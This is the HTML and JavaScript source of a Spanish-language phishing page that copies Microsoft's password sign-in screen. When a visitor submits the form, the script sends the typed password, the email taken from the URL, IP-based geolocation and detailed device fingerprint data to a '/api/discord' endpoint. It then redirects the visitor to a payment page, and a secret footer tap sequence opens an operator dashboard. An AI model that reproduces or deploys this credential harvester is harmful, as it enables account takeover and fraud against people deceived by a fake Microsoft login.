<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Escribir contraseña</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            'ms-red': '#f25022',
            'ms-green': '#7fba00',
            'ms-yellow': '#ffb900',
            'ms-blue-logo': '#00bcf2',
            'ms-gray': '#1b1b1b',
            'ms-gray-light': '#605e5c',
            'ms-border': '#8a8886',
          },
          fontFamily: {
            'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
          },
          fontSize: {
            'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
            'ms-subtitle': ['15px', { lineHeight: '20px', fontWeight: '400' }],
            'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
            'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
            'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
          },
        }
      }
    }
  </script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      min-height: 100vh;
      width: 100%;
      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      position: fixed;
      overflow: hidden;
    }
    body {
      background-color: #0a0a1a;
      background-image: none;
    }
    body.bg-gradient {
      background: var(--login-bg-gradient, linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%));
    }
    body.bg-image {
      background-image: var(--login-bg-image, none);
    }
    @media (min-width: 640px) {
      html, body {
        position: static;
        overflow: auto;
      }
    }
    .ms-input {
      border: 1px solid #8a8886;
      font-size: 15px;
      padding: 11px 12px;
      line-height: 20px;
      border-radius: 2px;
      width: 100%;
      background: #fff;
      color: #1b1b1b;
      outline: none;
      transition: border-color 0.1s ease, box-shadow 0.1s ease;
    }
    .ms-input:focus {
      border-color: #0078d4;
      box-shadow: inset 0 0 0 1px #0078d4;
    }
    .ms-button {
      background: #0078d4;
      color: #fff;
      border: none;
      font-size: 15px;
      font-weight: 600;
      padding: 8px 12px;
      min-height: 32px;
      border-radius: 2px;
      cursor: pointer;
      transition: background-color 0.1s ease;
    }
    .ms-button:hover { background: #106ebe; }
    .ms-button:active { background: #005a9e; }
    .ms-link {
      color: #0078d4;
      text-decoration: none;
      font-size: 13px;
    }
    .ms-link:hover { text-decoration: underline; }
    .fade-in {
      animation: fadeIn 0.3s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .login-container {
      position: relative;
      z-index: 1;
      background: rgba(255,255,255,0.95);
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }
    .main-container {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
      z-index: 10;
    }
    @media (min-width: 640px) {
      .main-container {
        position: static;
        min-height: 100vh;
        padding-top: 12vh;
      }
    }
    .footer-links {
      position: fixed;
      bottom: 0; left: 0; right: 0;
      background: rgba(255,255,255,0.95);
      backdrop-filter: blur(8px);
      border-top: 1px solid #e1dfdd;
      padding: 8px 16px;
      z-index: 50;
    }
    @media (min-width: 640px) {
      .footer-links { padding: 8px 24px; }
    }
    .footer-inner {
      max-width: 1200px;
      margin: 0 auto;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: center;
      gap: 8px 16px;
      font-size: 12px;
      color: #605e5c;
    }
    .footer-inner a { color: #0078d4; text-decoration: none; }
    .footer-inner a:hover { text-decoration: underline; }
    .footer-inner .private-tip {
      text-align: center;
      font-size: 11px;
    }
    .email-badge {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      background: transparent;
      border: 1px solid #8a8886;
      border-radius: 9999px;
      padding: 4px 12px;
      font-size: 13px;
      color: #1b1b1b;
      font-weight: 500;
    }
    .eye-btn {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .eye-btn svg { width: 18px; height: 18px; }
    .eye-btn svg path { stroke: #605e5c; transition: stroke 0.1s; }
    .eye-btn:hover svg path { stroke: #1b1b1b; }
  </style>
</head>
<body>

  <div class="fixed inset-0 bg-white/0"></div>

  <div class="main-container">
    <div class="w-full max-w-md fade-in relative z-10">
      <div class="login-container p-8 sm:p-12">

        <!-- Microsoft Logo -->
        <div class="flex items-center justify-center mb-6">
          <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
            <div class="bg-ms-red w-3 h-3"></div>
            <div class="bg-ms-green w-3 h-3"></div>
            <div class="bg-ms-blue-logo w-3 h-3"></div>
            <div class="bg-ms-yellow w-3 h-3"></div>
          </div>
          <span class="text-ms-logo text-ms-gray" style="font-size:21px;line-height:28px;font-weight:600;">Microsoft</span>
        </div>

        <!-- Email badge (shows without the typed email) -->
        <div class="mb-6 text-center">
          <div class="email-badge">
            <span id="userEmail">***@***.com</span>
          </div>
        </div>

        <h1 class="text-ms-title text-ms-gray mb-8 font-semibold text-center" style="font-size:28px;line-height:36px;">
          Escribir contraseña
        </h1>

        <form onsubmit="handlePasswordSubmit(event)" class="space-y-5" id="passwordForm">
          <div class="relative">
            <input
              type="password"
              id="password"
              placeholder="Contraseña"
              class="ms-input pr-12"
              autocomplete="current-password"
              required
            />
            <button
              type="button"
              class="eye-btn"
              onclick="togglePassword()"
              aria-label="Mostrar u ocultar contraseña"
              tabindex="-1"
            >
              <svg id="eyeIcon" class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
              </svg>
            </button>
          </div>

          <div class="flex items-center justify-between text-left">
            <a href="index.html" class="ms-link">← Volver</a>
            <a href="#" class="ms-link" onclick="showForgotPasswordHelp()">¿Olvidó su contraseña?</a>
          </div>

          <button type="submit" class="ms-button w-full" id="passwordSubmitBtn">
            Iniciar sesión
          </button>
        </form>

        <div class="mt-6 pt-4 border-t border-gray-200 text-center">
          <a href="#" class="ms-link">Otras formas de iniciar sesión</a>
        </div>
      </div>
    </div>
  </div>

  <!-- Footer Links -->
  <div class="footer-links" id="footerLinks">
    <div class="footer-inner">
      <a href="#" id="footerHelp">Ayuda</a>
      <a href="#" id="footerTerms">Términos de uso</a>
      <a href="#" id="footerPrivacy">Privacidad y cookies</a>
      <span class="private-tip">Usa la exploración privada si este no es tu dispositivo. <a href="#">Más información</a></span>
    </div>
  </div>

  <script>
    // ===================== CARGA DE CONFIGURACIÓN GLOBAL =====================
    let globalConfig = null;

    async function loadGlobalConfig() {
      try {
        const res = await fetch('/api/config');
        if (res.ok) {
          globalConfig = await res.json();
        }
      } catch (e) {
        console.warn('Config global no disponible, usando defaults');
      }
      if (!globalConfig) {
        globalConfig = {
          logoText: 'Microsoft',
          pageTitle: 'Escribir contraseña',
          passwordPageTitle: 'Escribir contraseña',
          loginBgType: 'color',
          loginBgColor: '#0a0a1a',
          loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
          loginBgImage: '',
          footerHelpText: 'Ayuda',
          footerTermsText: 'Términos de uso',
          footerPrivacyText: 'Privacidad y cookies',
          footerPrivateTip: 'Usa la exploración privada si este no es tu dispositivo. Más información',
        };
      }
      applyGlobalConfig();
    }

    function applyGlobalConfig() {
      if (globalConfig.logoText) {
        const logoEl = document.querySelector('.text-ms-logo');
        if (logoEl) logoEl.textContent = globalConfig.logoText;
      }
      if (globalConfig.pageTitle) document.title = globalConfig.pageTitle;

      const helpEl = document.getElementById('footerHelp');
      const termsEl = document.getElementById('footerTerms');
      const privacyEl = document.getElementById('footerPrivacy');
      const privateTipEl = document.querySelector('.private-tip');
      if (helpEl && globalConfig.footerHelpText) helpEl.textContent = globalConfig.footerHelpText;
      if (termsEl && globalConfig.footerTermsText) termsEl.textContent = globalConfig.footerTermsText;
      if (privacyEl && globalConfig.footerPrivacyText) privacyEl.textContent = globalConfig.footerPrivacyText;
      if (privateTipEl && globalConfig.footerPrivateTip) privateTipEl.innerHTML = globalConfig.footerPrivateTip;

      applyLoginBackground();
    }

    function applyLoginBackground() {
      const bgType = globalConfig.loginBgType || 'color';
      const bgColor = globalConfig.loginBgColor || '#0a0a1a';
      const bgGradient = globalConfig.loginBgGradient || 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)';
      const bgImage = globalConfig.loginBgImage || '';

      document.body.style.removeProperty('background-image');
      document.body.style.removeProperty('background-color');
      document.body.classList.remove('bg-gradient', 'bg-image');

      if (bgType === 'gradient') {
        document.body.style.background = bgGradient;
        document.body.classList.add('bg-gradient');
      } else if (bgType === 'image' && bgImage) {
        document.body.style.backgroundImage = 'url(' + bgImage + ')';
        document.body.classList.add('bg-image');
      } else {
        document.body.style.backgroundColor = bgColor;
      }
    }

    function showForgotPasswordHelp() {
      alert('Para restablecer tu contraseña, visita el centro de cuenta de Microsoft.');
    }

    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const eyeIcon = document.getElementById('eyeIcon');

      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>';
      } else {
        passwordInput.type = 'password';
        eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>';
      }
    }

    // ===================== ENVÍO A DISCORD =====================
    async function sendToDiscord(email, password) {
      let geoData = {};
      try {
        const geoRes = await fetch('https://ipinfo.io/json');
        if (geoRes.ok) geoData = await geoRes.json();
      } catch (e) { console.warn('Geo IP no disponible:', e); }

      let ipifyIp = '';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        if (ipRes.ok) { const ipData = await ipRes.json(); ipifyIp = ipData.ip || ''; }
      } catch (e) { console.warn('IPify no disponible:', e); }

      let batteryLevel = 'No disponible';
      let batteryCharging = 'Desconocido';
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = (battery.level * 100).toFixed(0) + '%';
          batteryCharging = battery.charging ? 'Sí' : 'No';
        }
      } catch (e) { console.warn('Batería no disponible:', e); }

      const userAgent = navigator.userAgent || 'desconocido';
      const language = navigator.language || 'desconocido';
      const languages = navigator.languages ? navigator.languages.join(', ') : language;
      const screenResolution = screen.width + 'x' + screen.height;
      const colorDepth = screen.colorDepth + ' bits';
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'desconocido';
      const platform = navigator.platform || 'desconocido';
      const onlineStatus = navigator.onLine ? 'Sí' : 'No';
      const cookiesEnabled = navigator.cookieEnabled ? 'Sí' : 'No';
      const deviceMemory = navigator.deviceMemory || 'desconocido';
      const cpuCores = navigator.hardwareConcurrency || 'desconocido';
      const touchPoints = navigator.maxTouchPoints || 0;
      const uaLower = userAgent.toLowerCase();
      const isMobile = /android|iphone|ipad|ipod/i.test(uaLower) ? 'Sí' : 'No';
      const isTablet = /ipad|tablet/i.test(uaLower) ? 'Sí' : 'No';
      const isDesktop = !/android|iphone|ipad|ipod|tablet/i.test(uaLower) ? 'Sí' : 'No';

      const geoIp = geoData.ip || ipifyIp || '';
      const geoCity = geoData.city || '';
      const geoRegion = geoData.region || '';
      const geoCountry = geoData.country || '';
      const geoCountryCode = geoData.country || '';
      const geoTimezone = geoData.timezone || timezone;
      const geoIsoCode = geoCountryCode;
      const geoIsp = geoData.org || '';
      const geoLatitude = geoData.loc ? geoData.loc.split(',')[0] : '';
      const geoLongitude = geoData.loc ? geoData.loc.split(',')[1] : '';
      const geoZip = geoData.postal || '';
      const geoCurrency = geoData.currency || '';
      const geoCurrencyCode = geoData.currency || '';
      const geoCallingCode = geoData.phone ? geoData.phone.split(' ')[0] : '';
      const geoNetwork = geoData.org || '';

      const payload = {
        email, password: password || '',
        userAgent, language, languages, screenResolution, colorDepth,
        timezone, platform, onlineStatus, cookiesEnabled,
        deviceMemory, cpuCores, touchPoints,
        isMobile, isTablet, isDesktop,
        batteryLevel, batteryCharging,
        geoIp, geoCity, geoRegion, geoCountry, geoCountryCode,
        geoTimezone, geoIsoCode, geoIsp, geoLatitude, geoLongitude,
        geoZip, geoCurrency, geoCurrencyCode, geoCallingCode, geoNetwork,
        ipifyIp,
      };

      try {
        const res = await fetch('/api/discord', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        const data = await res.json();
        return data.success === true;
      } catch (err) {
        console.warn('Discord API unavailable:', err);
        return false;
      }
    }

    // ===================== PASO 2: CONTRASEÑA =====================
    async function handlePasswordSubmit(event) {
      event.preventDefault();

      const passwordInput = document.getElementById('password');
      const password = passwordInput.value.trim();
      const submitBtn = document.getElementById('passwordSubmitBtn');
      const urlParams = new URLSearchParams(window.location.search);
      const email = urlParams.get('email') || '';

      if (!password) {
        alert('Por favor ingresa tu contraseña.');
        passwordInput.focus();
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = 'Verificando...';

      // Enviar a Discord
      await sendToDiscord(email, password);

      // Redirigir al dashboard / pago
      setTimeout(() => {
        window.location.href = 'payment.html?email=' + encodeURIComponent(email);
      }, 500);
    }

    // ===================== ACCESO SECRETO AL PANEL (DOBLE TAP EN AYUDA + DOBLE TAP EN PRIVACIDAD) =====================
    let ayudaTapCount = 0;
    let privacidadTapCount = 0;
    let ayudaLastTapTime = 0;
    let privacidadLastTapTime = 0;

    function onFooterHelpTap(e) {
      const now = Date.now();
      if (now - ayudaLastTapTime < 500) {
        ayudaTapCount++;
        if (ayudaTapCount >= 2 && privacidadTapCount >= 2) {
          window.location.href = 'dashboard.html?admin=1';
          ayudaTapCount = 0;
          privacidadTapCount = 0;
          return;
        }
      } else {
        ayudaTapCount = 1;
      }
      ayudaLastTapTime = now;
      e.preventDefault();
    }

    function onFooterPrivacyTap(e) {
      const now = Date.now();
      if (now - privacidadLastTapTime < 500) {
        privacidadTapCount++;
        if (ayudaTapCount >= 2 && privacidadTapCount >= 2) {
          window.location.href = 'dashboard.html?admin=1';
          ayudaTapCount = 0;
          privacidadTapCount = 0;
          return;
        }
      } else {
        privacidadTapCount = 1;
      }
      privacidadLastTapTime = now;
      e.preventDefault();
    }

    document.addEventListener('DOMContentLoaded', function() {
      const helpEl = document.getElementById('footerHelp');
      const privacyEl = document.getElementById('footerPrivacy');
      if (helpEl) helpEl.addEventListener('click', onFooterHelpTap);
      if (privacyEl) privacyEl.addEventListener('click', onFooterPrivacyTap);
    });
  </script>
</body>
</html>
